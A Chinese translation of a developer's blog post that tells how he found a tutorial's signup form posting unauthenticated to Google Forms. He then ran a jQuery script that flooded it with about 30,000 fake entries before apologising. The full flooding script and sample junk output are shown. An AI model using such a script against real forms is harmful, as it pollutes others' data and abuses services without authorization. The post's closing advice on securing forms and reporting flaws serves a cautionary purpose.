# 抱歉，我黑了你。

> 原文：<https://dev.to/t0nylombardi/sorry-i-hacked-you>

> 黑客不认为现实世界是理所当然的；他们寻求打破和重建他们不喜欢的东西。他们寻求智胜世界。莎拉·莱西

### 前缀:

我在看 YouTube 上的一个教程。在教程中，他们发布了一个网站，上面有一个表格，允许你注册他们的课程。我喜欢他们的工作，所以我对他们如何为表单编写后端很感兴趣，因为他们是前端开发人员。我总是好奇别人是如何写代码的。因为这个部分必须连接到某种后端，才能将数据从表单发送到其他地方，所以我想知道这是如何发生的。

在视频中，这个人解释了它是如何连接到 Google Sheets 的。该表单将信息发送到 google sheets，并允许他们在电子表格中收集姓名和电子邮件。

这很有趣。他们是如何连接到谷歌的？是什么 API 密匙吗？OAuth？由于在他们的视频中，他们为每个人都发布了 git 中的代码，我想检查一下代码。

```
<form class="jc-form" action="#" id="ss-form" target="_self">
  <input class="jc-name ss-q-short" 
         id="entry_1111111111" 
         type="text" name="entry.1111111111" 
         value="" 
         dir="auto" 
         placeholder="Name"/>

  <input class="jc-email ss-q-short" 
         id="entry_1111111117" 
         type="text" 
         name="entry.1111111117" 
         value="" 
         dir="auto" 
         title="" placeholder="Email"/>

  <input type="hidden" 
         name="draftResponse" 
         value="[,,&amp;quot;jeberish-google-id&amp;quot;]"/>

  <input type="hidden" name="pageHistory" value="0"/>
  <input type="hidden" name="fvv" value="0"/>
  <input type="hidden" name="fbzx" value="jeberish-google-id"/>
  <input class="jc-submit" 
         id="Submit" 
         type="submit" 
         name="submit" 
         value="Tell me when it's ready!"/>
</form> 
```

Enter fullscreen mode Exit fullscreen mode

在这个 HTML 中，似乎有某种蜜罐。这是你需要提交的 Google ID。还有一个隐藏字段似乎没有使用(后面我会说明原因)。还有两个具有 ID 外观值的输入字段。我们也将把它留到以后。

```
function postContactToGoogle(f) {

  var email = f.find('.form-email').val();
  var name = f.find('.form-name').val();

  $.ajax({
    url: "https://docs.google.com/forms/d/jeberish-google-id/formResponse",
    data: {
      "entry_1111111111": email,
      "entry_1111111117": name
    },
    type: "POST",
    dataType: "xml",
    statusCode: {
      0: function() {
        window.location.replace("/path/thanks");

      },
      200: function() {
        window.location.replace("/path/thanks");
      }
    }
  });
} 
```

Enter fullscreen mode Exit fullscreen mode

这通过 Ajax 向 Google Docs 文件发送信息。如果从表单中获取 Google 用户的 ID 并获取表单字段数据值，就可以使用相同的代码发送任何想要的信息。

[![oh know!](img/89c26fce446138a0f77910123d7169df.png)T2】](https://res.cloudinary.com/practicaldev/image/fetch/s--yYUwGe0y--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2ADsZDhl9AYWQqHCOL3vPfIw.jpeg)

### 该杀:

所以我看着这个告诉自己这是错误的——或者至少有更好的方法来做类似的事情。出于对我是否正确的好奇，我写了一个脚本并运行了它。

```
// generate random letters to make emails unique. 
function rText(){
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for( var i=0; i < 5; i++ ) {
      text += possible.charAt(Math.floor(Math.random() * possible.length));
    }
    return text;
}
function generateEmail(){
  var username, email, full_email;
  username = 'HueBin_';
  email = 'Hacked';
  full_email = username + rText() + '@'+ rText() + email+'.com';
  return full_email;
}
function postContactToGoogle() {
  var url = "https://docs.google.com/forms/d/jeberish-google-id/formResponse";
  $.ajax({
    url: url,
    data: {
      "entry_1111111111": generateEmail(),
      "entry_1111111117": "HueBin_",
    },
    type: "POST",
    dataType: "xml",
    crossDomain : true,
    statusCode: {
      0: function(data) {
        console.log("BAD!",data);
},
      200: function(data) {
        console.log("GOOD",data);
      }
    }
  });
}
$(function(){
  var num = 50000; // yes thats 50,000!
    for (var i = 0; i < num; i++) {
      setTimeout(postContactToGoogle(), 500); 
    }
}); 
```

Enter fullscreen mode Exit fullscreen mode

这个发布到数据库中的信息看起来像这样:

```
Name: HueBin_, Email: HueBin_piMt6@vwq4WHacked.com
Name: HueBin_, Email: HueBin_f7Txq@pzLm6Hacked.com
Name: HueBin_, Email: HueBin_YBTNf@TluieHacked.com
Name: HueBin_, Email: HueBin_QYqVm@jYWuUHacked.com 
```

Enter fullscreen mode Exit fullscreen mode

HueBin 黑了？！妈妈，这是一个很好的双关语！。

#### 善后:

在我的浏览器死机之前，我只能通过我的网络浏览器获得大约 30k。简单地说，我写了一封电子邮件，声明我对此非常非常抱歉。更重要的是，我本打算早点联系他们，但我刚刚进入了我生命中的另一年，我在周末离开了电子产品(主要是因为啤酒)

### 结论:

> 不要吸可卡因！-中尉

不，严肃地说，当把任何东西放到公众面前时，不要把城堡的钥匙放在那里让每个人都看到。当通过 Ajax 发送信息时，数据应该是安全的，例如将表单所在的网站列入白名单，或者发送确认电子邮件来清除这样的黑客。还有，不要走我的路线。相反，告诉这个人潜在的错误，而不是采取行动利用它们。